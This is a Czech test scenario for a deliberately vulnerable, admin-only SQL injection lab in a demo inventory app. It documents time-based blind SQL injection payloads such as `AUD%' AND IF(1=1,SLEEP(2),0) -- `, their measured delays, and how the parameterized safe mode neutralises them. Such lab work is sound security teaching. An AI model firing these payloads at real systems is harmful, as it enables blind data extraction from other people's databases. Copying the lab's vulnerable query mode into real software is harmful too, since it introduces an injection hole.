# Manual scenario: Time-based Blind SQL Injection v SQLi Labu

Datum ověření: 2026-08 06

Účel scénáře: připravit podklady pro ruční demonstraci Time-based Blind SQL Injection v modelové aplikaci Simple Inventory CRM.

## Kontext

Testovaný endpoint:

```text
POST /api/sqli-demo/run
```

SQLi Lab je dostupný pouze pro přihlášeného admin uživatele. Modul musí být povolen přes `DEMO_SQLI_LAB=true` a zranitelný režim `mode: "vuln"` je použit pouze při `DEMO_VULN=true`.

Společné parametry scénáře:

```json
{
  "pattern": "time",
  "target": "variants",
  "limit": 20
}
```

Použitý target: `variants`.

Použitý delay: `SLEEP(2)`, tedy přibližně 2000 ms.

Pro time-based scénář je klíčové pole `durationMs`. Backend ho měří v `SqliLabService.run()` od začátku zpracování requestu po dokončení databázového dotazu nebo zachycení chyby. Hodnota tedy zahrnuje čas strávený v SQL dotazu včetně případného `SLEEP`.

Sledovaná pole odpovědi:

- `requestedMode`,
- `mode`,
- `pattern`,
- `target`,
- `durationMs`,
- `rowCount`,
- `dataPreview`,
- `error`,
- `note`.

## Implementační místo

Relevantní soubory:

```text
backend/src/modules/sqliLab/sqliLab.router.js
backend/src/modules/sqliLab/validators.js
backend/src/modules/sqliLab/queryFactory.js
backend/src/modules/sqliLab/strategies/time.strategy.js
backend/src/modules/sqliLab/SqliLabService.js
```

Router potvrzuje admin-only přístup a kontrolu `DEMO_SQLI_LAB`:

```js
router.post('/run',
  authMiddleware,
  requireRole('admin'),
  (req, res, next) => {
    if (!DEMO_SQLI_LAB) return res.status(404).json({ error: 'Not found' });
    return next();
  },
  async (req, res) => {
    const result = await run({ user: req.user, input: req.body });
    res.json(result);
  }
);
```

Validátor používá pole `payload`, případně fallback `q`, a zranitelný režim povolí pouze při `DEMO_VULN=true`:

```js
const mode =
  requestedMode === 'vuln' && DEMO_VULN
    ? 'vuln'
    : 'safe';

const qRaw =
  typeof input.payload === 'string'
    ? input.payload
    : typeof input.q === 'string'
      ? input.q
      : '';
```

Time strategie nepoužívá samostatné pole `delayMs`. Zpoždění musí být součástí payloadu:

```js
function buildPlan(norm) {
  return {
    factoryInput: {
      pattern: norm.pattern,
      target: norm.target,
      mode: norm.mode,
      q: norm.q ?? '',
      limit: norm.limit,
    },
    allowDbErrorInResponse: norm.mode === 'vuln',
    note:
      "Time-based: v DEMO vuln režimu zkus payload, který vyvolá SLEEP (např. %' OR IF(1=1,SLEEP(2),0) -- ). Sleduj durationMs.",
  };
}
```

`queryFactory.js` má pro `pattern: "time"` speciální nastavení:

```js
const deterministic = p === "time";
const limitMode = deterministic ? "one" : "normal";
```

To znamená, že time-based dotaz je připnutý na deterministický řádek a používá `LIMIT 1`:

```js
if (opts.deterministic) parts.push(spec.deterministicWhere);
```

Pro target `variants` je deterministická podmínka:

```js
deterministicWhere: "v.id = (SELECT MIN(id) FROM item_variants)",
```

Z tohoto důvodu nebyl pro pozitivní kontrolu použit payload `SQLI`. Seedované hodnoty `SQLI-LOWSTOCK` a `SQLI-UNION-1` nejsou na řádku s minimálním `id`, takže v time režimu nevrací výsledek. Pozitivní kontrola byla upravena na `AUD-LAP-13`, což odpovídá deterministickému prvnímu řádku.

`SqliLabService` měří čas a zároveň chrání databázový dotaz hard timeoutem:

```js
const started = Date.now();
const rowsRaw = await runQueryWithHardTimeout(query.sql, query.params, 12000);
const durationMs = Date.now() - started;
```

Ochranný timeout je nastaven na 12000 ms. Předběžně bylo ověřeno, že payload typu `NONMATCH%' OR IF(1=1,SLEEP(2),0) -- ` může kvůli vyhodnocení přes více řádků narazit právě na timeout. Pro hlavní měření byl proto použit stabilnější payload nad existujícím prefixem `AUD`.

## Testovací requesty

### A. Kontrolní pozitivní vstup ve zranitelném režimu

Význam: ověřuje běžné vyhledávání nad deterministickým prvním řádkem bez časového payloadu.

```http
POST /api/sqli-demo/run
Content-Type: application/json
Authorization: Bearer <admin_token>
```

```json
{
  "mode": "vuln",
  "pattern": "time",
  "target": "variants",
  "payload": "AUD-LAP-13",
  "limit": 20
}
```

### B. Baseline: běžný neexistující text

Význam: získává baseline pro prázdný výsledek bez SQL chyby a bez umělého zpoždění.

```http
POST /api/sqli-demo/run
Content-Type: application/json
Authorization: Bearer <admin_token>
```

```json
{
  "mode": "vuln",
  "pattern": "time",
  "target": "variants",
  "payload": "NONMATCH",
  "limit": 20
}
```

### C. TRUE time-based payload ve zranitelném režimu

Význam: payload se ve zranitelném režimu stane součástí SQL výrazu a při pravdivé podmínce vyvolá `SLEEP(2)`.

```http
POST /api/sqli-demo/run
Content-Type: application/json
Authorization: Bearer <admin_token>
```

```json
{
  "mode": "vuln",
  "pattern": "time",
  "target": "variants",
  "payload": "AUD%' AND IF(1=1,SLEEP(2),0) -- ",
  "limit": 20
}
```

### D. FALSE time-based payload ve zranitelném režimu

Význam: ověřuje, že zpoždění závisí na podmínce a není způsobeno běžnou latencí aplikace.

```http
POST /api/sqli-demo/run
Content-Type: application/json
Authorization: Bearer <admin_token>
```

```json
{
  "mode": "vuln",
  "pattern": "time",
  "target": "variants",
  "payload": "AUD%' AND IF(1=0,SLEEP(2),0) -- ",
  "limit": 20
}
```

### E. Stejný TRUE payload v bezpečném režimu

Význam: ověřuje, že safe režim stejný payload neinterpretuje jako SQL syntaxi, ale jako hledaný text.

```http
POST /api/sqli-demo/run
Content-Type: application/json
Authorization: Bearer <admin_token>
```

```json
{
  "mode": "safe",
  "pattern": "time",
  "target": "variants",
  "payload": "AUD%' AND IF(1=1,SLEEP(2),0) -- ",
  "limit": 20
}
```

### F. Volitelný jednoduchý SLEEP payload

Význam: doplňkově ověřuje, že samotné zavolání `SLEEP(2)` funguje v kontextu zranitelného dotazu. Tento krok není hlavním důkazem, protože nemá dvojici TRUE/FALSE podmínky.

```http
POST /api/sqli-demo/run
Content-Type: application/json
Authorization: Bearer <admin_token>
```

```json
{
  "mode": "vuln",
  "pattern": "time",
  "target": "variants",
  "payload": "AUD%' AND SLEEP(2) -- ",
  "limit": 20
}
```

## Naměřené výsledky

Test byl spuštěn proti lokálnímu backendu:

```text
http://127.0.0.1:4000
```

Testovací requesty nemění seedovaná aplikační data. Přihlášení admina pro získání tokenu může vytvořit audit log. Token ani lokální secrets nejsou v dokumentu uvedené.

### Přehled hlavních kroků

| Testovací krok | Režim | Payload | HTTP status | rowCount | error | durationMs | Pozorovaný výsledek |
| --- | --- | --- | ---: | ---: | --- | --- | --- |
| A - pozitivní kontrola | vuln | `AUD-LAP-13` | 200 | 1 | `null` | `1, 2, 1, 0, 1` | Běžný vstup vrátil deterministický první řádek bez zpoždění. |
| B - baseline NONMATCH | vuln | `NONMATCH` | 200 | 0 | `null` | `1, 1, 3, 1, 1` | Prázdný výsledek bez SQL chyby a bez zpoždění. |
| C - TRUE time payload | vuln | `AUD%' AND IF(1=1,SLEEP(2),0) -- ` | 200 | 0 | `null` | `2005, 2010, 2009, 2008, 2007` | Opakovatelné zpoždění přibližně 2 sekundy. |
| D - FALSE time payload | vuln | `AUD%' AND IF(1=0,SLEEP(2),0) -- ` | 200 | 0 | `null` | `10, 3, 3, 1, 3` | Hodnoty zůstaly blízko baseline. |
| E - TRUE payload v safe režimu | safe | `AUD%' AND IF(1=1,SLEEP(2),0) -- ` | 200 | 0 | `null` | `1, 3, 3, 1, 1` | Safe režim nezpůsobil zpoždění. |
| F - jednoduchý SLEEP payload | vuln | `AUD%' AND SLEEP(2) -- ` | 200 | 0 | `null` | `2009, 2009, 2006` | Doplňkový payload potvrdil, že `SLEEP(2)` je ve vuln větvi vykonán. |

### Souhrn opakovaných měření

| Testovací krok | Režim | Počet měření | durationMs hodnoty | Průměr | Medián | Min | Max | Interpretace |
| --- | --- | ---: | --- | ---: | ---: | ---: | ---: | --- |
| A - pozitivní kontrola | vuln | 5 | `1, 2, 1, 0, 1` | 1.0 | 1 | 0 | 2 | Běžná rychlá odezva bez umělého zpoždění. |
| B - baseline NONMATCH | vuln | 5 | `1, 1, 3, 1, 1` | 1.4 | 1 | 1 | 3 | Stabilní baseline pro prázdný výsledek. |
| C - TRUE time payload | vuln | 5 | `2005, 2010, 2009, 2008, 2007` | 2007.8 | 2008 | 2005 | 2010 | Medián je přibližně o 2007 ms vyšší než baseline. |
| D - FALSE time payload | vuln | 5 | `10, 3, 3, 1, 3` | 4.0 | 3 | 1 | 10 | Bez časového zpoždění; drobná odchylka 10 ms nemění medián. |
| E - TRUE payload v safe režimu | safe | 5 | `1, 3, 3, 1, 1` | 1.8 | 1 | 1 | 3 | Safe režim odpovídá baseline, payload je zpracován jako text. |
| F - jednoduchý SLEEP payload | vuln | 3 | `2009, 2009, 2006` | 2008.0 | 2009 | 2006 | 2009 | Doplňkový důkaz vykonání `SLEEP(2)` ve zranitelné větvi. |

Klíčové srovnání:

- baseline medián: `1 ms`,
- TRUE time payload medián: `2008 ms`,
- FALSE time payload medián: `3 ms`,
- safe režim se stejným TRUE payloadem medián: `1 ms`.

## Ukázky odpovědí

### B. Baseline NONMATCH

```json
{
  "mode": "vuln",
  "pattern": "time",
  "target": "variants",
  "durationMs": 1,
  "rowCount": 0,
  "dataPreview": [],
  "error": null
}
```

### C. TRUE time payload ve zranitelném režimu

```json
{
  "mode": "vuln",
  "pattern": "time",
  "target": "variants",
  "durationMs": 2008,
  "rowCount": 0,
  "dataPreview": [],
  "error": null
}
```

### D. FALSE time payload ve zranitelném režimu

```json
{
  "mode": "vuln",
  "pattern": "time",
  "target": "variants",
  "durationMs": 3,
  "rowCount": 0,
  "dataPreview": [],
  "error": null
}
```

### E. Stejný TRUE payload v bezpečném režimu

```json
{
  "mode": "safe",
  "pattern": "time",
  "target": "variants",
  "durationMs": 1,
  "rowCount": 0,
  "dataPreview": [],
  "error": null
}
```

## Závěr pro scénář

Kontrolní pozitivní vstup `AUD-LAP-13` potvrdil, že time režim nad targetem `variants` funguje a vrací deterministický první řádek bez zpoždění.

Baseline `NONMATCH` měla medián `1 ms`, tedy stabilní rychlou odezvu bez chyby a bez vrácených dat.

TRUE payload `AUD%' AND IF(1=1,SLEEP(2),0) -- ` měl v pěti měřeních medián `2008 ms`. To odpovídá zvolenému zpoždění `SLEEP(2)` a je hlavním potvrzením Time-based Blind SQL Injection.

FALSE payload `AUD%' AND IF(1=0,SLEEP(2),0) -- ` měl medián `3 ms`, tedy zůstal blízko baseline. Tím se potvrzuje, že rozdíl není způsoben běžnou latencí serveru, ale vyhodnocením SQL podmínky.

Stejný TRUE payload v safe režimu měl medián `1 ms`. Parametrizovaný dotaz payload neinterpretuje jako SQL syntaxi, ale jako textovou hodnotu, takže `SLEEP(2)` nebyl vykonán.

U time-based scénáře je nutné opakované měření, protože důkazem není obsah odpovědi ani databázová chyba. Důkazem je opakovatelný časový rozdíl mezi baseline, TRUE podmínkou, FALSE podmínkou a bezpečným režimem.
